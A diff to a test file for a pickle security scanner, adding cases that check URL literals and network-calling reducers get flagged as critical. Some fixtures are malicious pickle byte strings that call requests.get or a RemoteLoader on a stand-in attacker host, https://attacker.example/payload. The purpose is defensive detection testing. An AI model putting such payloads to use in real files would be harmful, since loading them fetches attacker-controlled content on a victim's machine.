@@ -1636,10 +1636,23 @@ def test_scan_stream_allows_large_inert_url_literal_at_raw_scan_budget_boundary(
     )
 
 
-def test_scan_stream_preserves_inert_url_literal_when_first_stream_truncates() -> None:
+def test_scan_stream_fails_closed_for_truncated_first_stream_url_literal() -> None:
     payload = b"Vhttps://docs.example.invalid/reference/requests.get(url)\nX"
 
     result = PickleScanner().scan_stream(io.BytesIO(payload), len(payload), source="truncated-url-metadata.pkl")
+
+    assert any(
+        issue.severity == IssueSeverity.CRITICAL
+        and issue.details.get("type") == "explicit_network_pattern"
+        and issue.details.get("matched_text") == "https://docs.example.invalid/reference/requests.get(url)"
+        for issue in result.issues
+    )
+
+
+def test_scan_stream_allows_inert_url_literal_before_unknown_opcode() -> None:
+    payload = b"Vhttps://docs.example.invalid/reference/requests.get(url)\nz"
+
+    result = PickleScanner().scan_stream(io.BytesIO(payload), len(payload), source="malformed-url-metadata.pkl")
 
     assert not any(issue.rule_code == "S310" and issue.severity == IssueSeverity.CRITICAL for issue in result.issues)
 
@@ -1837,6 +1850,22 @@ def test_scan_stream_keeps_main_url_reducer_actionable() -> None:
     payload = b"c__main__\nRemoteLoader\n(Vhttps://attacker.example/payload\ntR."
 
     result = PickleScanner().scan_stream(io.BytesIO(payload), len(payload), source="main-url-reducer.pkl")
+
+    explicit_url_issues = [
+        issue
+        for issue in result.issues
+        if issue.rule_code == "S310"
+        and issue.severity == IssueSeverity.CRITICAL
+        and issue.details.get("type") == "explicit_network_pattern"
+        and issue.details.get("matched_text") == "https://attacker.example/payload"
+    ]
+    assert len(explicit_url_issues) == 1
+
+
+def test_scan_stream_keeps_requests_url_reducer_actionable() -> None:
+    payload = b"crequests\nget\n(Vhttps://attacker.example/payload\ntR."
+
+    result = PickleScanner().scan_stream(io.BytesIO(payload), len(payload), source="requests-url-reducer.pkl")
 
     explicit_url_issues = [
         issue
